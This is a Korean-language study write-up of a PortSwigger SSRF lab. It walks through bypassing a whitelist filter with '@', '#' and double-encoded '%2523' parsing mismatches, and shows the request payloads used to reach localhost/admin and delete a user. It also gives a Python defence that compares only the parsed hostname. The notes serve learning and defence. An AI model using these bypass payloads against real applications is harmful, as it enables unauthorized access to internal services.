# Lab: SSRF with whitelist-based input filter

## 개요

- **난이도**: Expert
- **주제**: SSRF — 화이트리스트 필터 우회 / URL 파싱 불일치 / `@` · `#` 특수문자 혼용
- **링크**: https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter

## 목표

`stockApi` 파라미터에 화이트리스트 필터가 적용되어 `stock.weliketoshop.net` 도메인만 허용된다. URL 구조에서 `@`(userinfo 구분자)와 `#`(fragment 구분자)에 대한 **필터와 HTTP 클라이언트 간의 파싱 불일치**를 이용해 필터를 우회하고, localhost 관리자 패널에서 carlos 를 삭제한다.

## 005 랩(Open Redirect)과의 차이

```
[005 랩 — 화이트리스트 우회 via Open Redirect]
  우회 방법: 자사 도메인 내 open redirect 경유
  핵심: 서버가 리다이렉트를 따라가는 동작 이용
  필요 조건: 애플리케이션 내 open redirect 취약점 존재

[007 랩 (이번) — 화이트리스트 우회 via URL 파싱 불일치]
  우회 방법: @ 와 # 로 URL 파서를 혼란시킴
  핵심: 필터와 HTTP 클라이언트가 URL 을 다르게 파싱
  필요 조건: 필터가 URL 구조를 정밀하게 검사하지 않음
```

## URL 구조 기초

```
https://user:pass@host:port/path?query#fragment

  userinfo:  user:pass  (@ 앞)
  host:      host
  port:      port
  path:      /path
  query:     query
  fragment:  fragment  (# 뒤 — 서버에 전송되지 않음)
```

## 핵심 우회 기법

### 기법 1 — `@` : userinfo 영역에 도메인 삽입

```
http://stock.weliketoshop.net@localhost/admin

URL 구조:
  userinfo: stock.weliketoshop.net  ← 필터가 도메인으로 오인
  host:     localhost                ← 실제 요청 대상

필터 (느슨한 문자열 검사):
  URL 에서 "stock.weliketoshop.net" 발견 → 허용

HTTP 클라이언트 (정확한 URL 파싱):
  host = localhost → localhost 로 요청
  → SSRF 성공
```

### 기법 2 — `#` : fragment 영역에 도메인 삽입

```
http://localhost#stock.weliketoshop.net

URL 구조:
  host:     localhost
  fragment: stock.weliketoshop.net  ← 서버에 전송되지 않음

필터 (느슨한 문자열 검사):
  URL 에서 "stock.weliketoshop.net" 발견 → 허용

HTTP 클라이언트:
  fragment 제거 후 요청: GET http://localhost/
  → localhost 로 요청 → SSRF 성공

핵심: fragment(#) 는 클라이언트 측에서만 처리되며
       서버로 전송되는 실제 HTTP 요청에는 포함되지 않음
```

### 기법 3 — `@` + `#` 조합 (최종 우회)

필터가 host 를 정밀하게 검사하는 경우, `#` 을 URL 인코딩한 `%23` 을 userinfo 에 삽입해 파싱을 혼란시킨다:

```
http://localhost%2523admin

  %25 = %  → %2523 을 디코딩하면 %23 = #
  결과: localhost%23admin
        → 일부 파서는 # 로 인식해 localhost 가 host, admin 이 fragment
        → 다른 파서는 %23 을 문자 그대로 처리해 localhost%23admin 을 host 로 인식

[이번 랩의 최종 페이로드]
  http://stock.weliketoshop.net%23@localhost/admin

  인코딩 전: http://stock.weliketoshop.net#@localhost/admin

  파서 A (필터):
    # 를 fragment 시작으로 인식
    host = stock.weliketoshop.net → 허용!
    fragment = @localhost/admin   (무시)

  파서 B (HTTP 클라이언트):
    %23 = # 를 userinfo 내 문자로 처리
    userinfo = stock.weliketoshop.net#
    host = localhost
    → localhost 로 요청 → SSRF 성공!
```

## 공격 단계

### 1단계 — 필터 동작 파악

```http
POST /product/stock HTTP/1.1
stockApi=http://localhost/admin
```
→ 차단: "External stock check host must be stock.weliketoshop.net"

```http
stockApi=http://stock.weliketoshop.net/
```
→ 허용 (정상 응답)

### 2단계 — `@` 단독 테스트

```http
stockApi=http://stock.weliketoshop.net@localhost/admin
```
→ 차단: 필터가 host 파싱을 정확히 수행하면 localhost 를 감지

### 3단계 — `#` 인코딩 조합으로 최종 우회

```http
stockApi=http://stock.weliketoshop.net%2523@localhost/admin
```

```
%2523 디코딩:
  서버 1차 디코딩: %2523 → %23
  서버 2차 디코딩: %23   → #

필터가 보는 URL: http://stock.weliketoshop.net%23@localhost/admin
  → stock.weliketoshop.net 포함 → 통과

HTTP 클라이언트가 해석: http://stock.weliketoshop.net#@localhost/admin
  → userinfo 부분에 # 포함 → host = localhost
  → localhost 로 요청 → SSRF!
```

### 4단계 — /admin 접근 후 carlos 삭제

```http
stockApi=http://stock.weliketoshop.net%2523@localhost/admin/delete?username=carlos
```

## 파서 불일치 원리 요약

```
[필터]                        [HTTP 클라이언트]
URL: http://stock.weliketoshop.net%23@localhost/admin

%23 처리:  → %23 (문자 그대로)    → # (디코딩)
@ 해석:    → host 검색 → stock   → userinfo 구분 → host=localhost
결과:       → stock.weliketoshop.net → 허용!    → localhost → 요청!

핵심: 같은 URL 을 서로 다르게 파싱 → 필터 우회
```

## 004 블랙리스트 우회와의 비교

```
[004 — 블랙리스트 우회]
  필터: "admin", "127.0.0.1" 등 차단 목록 보유
  우회: loopback 축약(127.1) + 더블 인코딩(%2561dmin)
  원리: 차단 키워드를 변형해 감지 회피

[007 (이번) — 화이트리스트 우회]
  필터: "stock.weliketoshop.net" 만 허용
  우회: @ + # 조합으로 도메인을 URL 비호스트 영역에 배치
  원리: 필터와 클라이언트의 URL 파싱 불일치 이용
```

## 방어

```
[잘못된 방어 — 문자열 포함 검사]
  if "stock.weliketoshop.net" in url: allow()
  → @ 또는 # 로 도메인을 다른 위치에 삽입 가능

[올바른 방어 — URL 정규화 후 host 비교]
  from urllib.parse import urlparse

  def is_allowed(url: str) -> bool:
      parsed = urlparse(url)
      # host 만 비교, userinfo/fragment 무시
      return parsed.hostname == "stock.weliketoshop.net"

  → userinfo 에 도메인 삽입해도 차단
  → fragment 에 도메인 삽입해도 차단
  → URL 디코딩 후 재파싱까지 수행해야 완전 방어
```

## 핵심 정리

- `@` 는 URL 에서 userinfo(자격증명)와 host 를 구분하며, 도메인을 userinfo 영역에 삽입하면 필터를 속일 수 있다.
- `#` 은 fragment 시작 문자로, 이후 내용은 서버에 전달되지 않는다. fragment 에 허용 도메인을 삽입하면 문자열 검사를 통과할 수 있다.
- `%23`(인코딩된 `#`)을 userinfo 영역에 삽입하면, 필터와 HTTP 클라이언트가 `@` 앞의 host 를 서로 다르게 해석하는 파싱 불일치가 발생한다.
- URL 화이트리스트 검사는 반드시 **URL 파싱 → 정규화 → host 필드만 비교** 방식으로 구현해야 한다.

## 배운 점 및 추가 학습

### 1. URL 특수문자와 파싱 불일치 사례

```
문자   의미               우회 활용
@      userinfo/host 구분  도메인을 userinfo 에 삽입
#      fragment 시작       허용 도메인을 fragment 에 삽입
%23    # 의 인코딩         파서마다 디코딩 시점 달라 불일치 발생
//     경로 구분           프로토콜 없는 URL 처리 불일치
\      일부 파서의 / 대체  경로 구분자 혼용
```

### 2. 화이트리스트 우회 기법 비교

```
[Open Redirect (005 랩)]
  전제: 애플리케이션 내 open redirect 취약점 필요
  방법: 허용 도메인의 redirect 경로를 경유

[URL 파싱 불일치 (007 랩, 이번)]
  전제: 필터가 URL 을 정밀하게 파싱하지 않음
  방법: @, #, %23 으로 파서 혼란 유발
  장점: open redirect 취약점 없어도 공격 가능
```

### 3. 001~007 랩 SSRF 전체 비교

| # | 진입점 | 필터 | 핵심 기법 | 응답 | 난이도 |
|---|--------|------|-----------|------|--------|
| 001 | URL 파라미터 | 없음 | loopback 신뢰 | O | Apprentice |
| 002 | URL 파라미터 | 없음 | 사설 IP 스캔 | O | Apprentice |
| 003 | Referer 헤더 | 없음 | OOB 탐지 | X | Practitioner |
| 004 | URL 파라미터 | 블랙리스트 | 축약형+더블인코딩 | O | Practitioner |
| 005 | URL 파라미터 | 화이트리스트 | Open Redirect | O | Practitioner |
| 006 | Referer 헤더 | 없음 | Shellshock+OOB탈취 | X | Expert |
| 007 | URL 파라미터 | 화이트리스트 | @ · # 파싱 불일치 | O | Expert |
